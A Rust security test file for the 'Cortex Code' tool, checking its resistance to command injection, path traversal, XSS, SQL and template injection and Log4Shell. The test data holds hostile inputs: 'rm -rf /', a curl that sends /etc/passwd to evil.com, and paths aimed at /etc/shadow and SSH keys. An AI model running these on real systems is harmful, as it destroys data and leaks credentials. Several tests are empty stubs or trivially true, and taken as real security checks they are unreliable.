//! Security tests for Cortex Code
//! Tests for OWASP compliance, security vulnerabilities, and defensive measures

use cortex_code::{
    config::Config,
    providers::local::LocalMLXProvider,
    server::DaemonServer,
    app::CortexApp,
};
use tokio_test;
use std::time::Duration;

#[tokio::test]
async fn test_mlx_provider_prevents_command_injection() {
    let provider = LocalMLXProvider::new().unwrap();

    // Test malicious prompts that could lead to command injection
    let malicious_prompts = vec![
        "'; rm -rf / #",
        "$(whoami)",
        "`id`",
        "'; curl http://evil.com/steal?data=$(cat /etc/passwd) #",
        "\\n'; python -c \"import os; os.system('rm -rf /')\" #",
    ];

    for prompt in malicious_prompts {
        // Should not execute system commands or cause errors
        let result = provider.complete(prompt).await;

        // Either succeeds with safe output or fails gracefully
        match result {
            Ok(response) => {
                assert!(!response.contains("/etc/passwd"));
                assert!(!response.contains("root:"));
                assert!(!response.contains("uid="));
            }
            Err(_) => {
                // Graceful failure is acceptable
            }
        }
    }
}

#[tokio::test]
async fn test_daemon_server_secure_binding() {
    let config = Config::test_config();
    let app = CortexApp::new(config).await.unwrap();
    let daemon = DaemonServer::new(app, 0); // Use port 0 for random assignment

    // In debug builds, should bind to localhost only
    #[cfg(debug_assertions)]
    {
        // This test would need to check the actual binding address
        // For now, we verify the server can start without binding to 0.0.0.0
        // In a real implementation, we'd inspect the TcpListener address
    }

    // Test that server doesn't accept connections from external IPs in debug mode
    // This would require integration testing with actual network connections
}

#[tokio::test]
async fn test_memory_storage_prevents_path_traversal() {
    use cortex_code::memory::MemoryStorage;
    use cortex_code::memory::storage::MemoryConfig;

    let config = MemoryConfig::default()
        .with_path("/tmp/test_agents.md");

    let mut storage = MemoryStorage::new(config).await.unwrap();

    // Test path traversal attempts
    let malicious_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/shadow",
        "../../../../home/user/.ssh/id_rsa",
    ];

    for path in malicious_paths {
        // Should not be able to access files outside the designated directory
        let result = storage.add_conversation("test", path).await;

        // Should either fail or only access files within the safe directory
        match result {
            Ok(_) => {
                // Verify it didn't actually access the malicious path
                // This would need file system monitoring or mock testing
            }
            Err(_) => {
                // Rejection is the expected behavior
            }
        }
    }
}

#[tokio::test]
async fn test_input_sanitization() {
    let config = Config::test_config();
    let mut app = CortexApp::new(config).await.unwrap();

    // Test various types of potentially malicious input
    let test_inputs = vec![
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "{{7*7}}",
        "${jndi:ldap://evil.com/exploit}",
        "\\x00\\x01\\x02", // null bytes and control characters
    ];

    for input in test_inputs {
        let result = app.get_ai_response(input).await;

        match result {
            Ok(response) => {
                // Response should not contain the malicious input verbatim
                assert!(!response.contains("<script>"));
                assert!(!response.contains("DROP TABLE"));
                assert!(!response.contains("{{7*7}}"));
                assert!(!response.contains("jndi:ldap"));
            }
            Err(_) => {
                // Graceful failure is acceptable
            }
        }
    }
}

#[tokio::test]
async fn test_resource_limits() {
    let config = Config::test_config();
    let mut app = CortexApp::new(config).await.unwrap();

    // Test very large input that could cause DoS
    let large_input = "A".repeat(1_000_000); // 1MB of text

    let start_time = std::time::Instant::now();
    let result = app.get_ai_response(&large_input).await;
    let duration = start_time.elapsed();

    // Should either handle large input gracefully or reject it quickly
    assert!(duration < Duration::from_secs(30), "Request should not hang indefinitely");

    match result {
        Ok(response) => {
            // Should not echo back the entire large input
            assert!(response.len() < large_input.len() / 10);
        }
        Err(_) => {
            // Rejection is acceptable for oversized input
        }
    }
}

#[tokio::test]
async fn test_session_isolation() {
    let config = Config::test_config();
    let app1 = CortexApp::new(config.clone()).await.unwrap();
    let app2 = CortexApp::new(config).await.unwrap();

    // Verify that sessions don't leak information between instances
    // This would need more sophisticated testing with actual session management

    // For now, just verify they're separate instances
    assert_ne!(
        std::ptr::addr_of!(app1) as *const _,
        std::ptr::addr_of!(app2) as *const _
    );
}

#[tokio::test]
async fn test_error_message_information_disclosure() {
    let config = Config::test_config();
    let mut app = CortexApp::new(config).await.unwrap();

    // Test that error messages don't reveal sensitive information
    let result = app.add_mcp_server("test", "invalid json {").await;

    match result {
        Err(error) => {
            let error_str = error.to_string();

            // Should not reveal internal paths or implementation details
            assert!(!error_str.contains("/Users/"));
            assert!(!error_str.contains("/home/"));
            assert!(!error_str.contains("C:\\"));
            assert!(!error_str.contains("panic"));
            assert!(!error_str.contains("unwrap"));
        }
        Ok(_) => {
            panic!("Expected error for invalid JSON");
        }
    }
}

#[cfg(test)]
mod integration_security_tests {
    use super::*;
    use std::process::Command;

    #[tokio::test]
    async fn test_no_hardcoded_secrets() {
        // Scan source code for potential hardcoded secrets
        let output = Command::new("grep")
            .args([
                "-r", "-i",
                "--include=*.rs",
                "-E",
                "(password|secret|key|token|api_key)\\s*=\\s*[\"'][^\"']{8,}[\"']",
                "src/"
            ])
            .output();

        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if !stdout.is_empty() {
                panic!("Potential hardcoded secrets found:\n{}", stdout);
            }
        }
    }

    #[tokio::test]
    async fn test_dependency_vulnerabilities() {
        // Check for known vulnerable dependencies using cargo audit
        let output = Command::new("cargo")
            .args(["audit", "--json"])
            .output();

        if let Ok(output) = output {
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.contains("vulnerabilities found") {
                    panic!("Vulnerable dependencies found: {}", stderr);
                }
            }
        }
    }
}
